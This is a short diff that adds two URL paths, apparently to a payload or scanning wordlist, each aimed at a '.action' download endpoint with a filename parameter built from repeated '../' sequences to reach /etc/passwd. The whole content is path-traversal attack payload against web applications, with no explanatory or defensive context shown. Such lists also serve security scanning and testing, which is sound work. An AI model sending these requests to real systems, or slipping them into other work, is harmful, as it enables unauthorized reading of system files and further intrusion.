@@ -1,0 +1,2 @@
+/org_execl_download.action?filename=../../../../../../../../../../../../../etc/passwd
+/download.action?filename=../../../../../../etc/passwd
